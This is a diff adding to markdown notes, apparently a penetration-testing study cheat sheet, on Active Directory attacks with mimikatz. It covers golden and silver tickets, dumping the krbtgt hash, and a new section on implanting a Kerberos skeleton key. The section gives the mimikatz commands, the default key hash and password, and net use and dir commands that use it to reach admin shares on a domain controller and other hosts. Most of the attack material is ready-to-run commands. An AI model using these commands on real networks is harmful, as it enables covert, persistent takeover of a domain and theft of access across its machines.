@@ -178,6 +178,7 @@ klist
 - A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. 
 - This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash
 ### Dump the krbtgt hash
+- ![alt text](https://i.imgur.com/VOEsU4O.png)
 ````
 mimikatz.exe
 privilege::debug
@@ -199,12 +200,31 @@ misc::cmd
 - However if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket. 
 - However, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
 - ![alt text](https://i.imgur.com/BSh4rXy.png)
-- 
-
-
-
-
-
+## Kerberos Backdoors with mimikatz
+-  A Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password. 
+- The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. 
+- A skeleton key only works using Kerberos RC4 encryption. 
+- The default hash for a mimikatz skeleton key is `60BA4FCADC466C7A033C178194C03DF6` which makes the password -`"mimikatz"`
+### Skeleton Key Overview
+- The timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash.
+- Once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.
+````
+mimikatz.exe
+privilege::debug
+misc::skeleton
+````
+- ![alt text](https://i.imgur.com/wI802gw.png)
+### Accessing the forest 
+- The default credentials will be: `mimikatz`
+- The share will now be accessible without the need for the Administrators password
+````
+net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz 
+````
+- Access the directory of Desktop-1 without ever knowing what users have access to Desktop-1
+````
+dir \\Desktop-1\c$ /user:Machine1 mimikatz 
+````
+- The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques
 
 
 
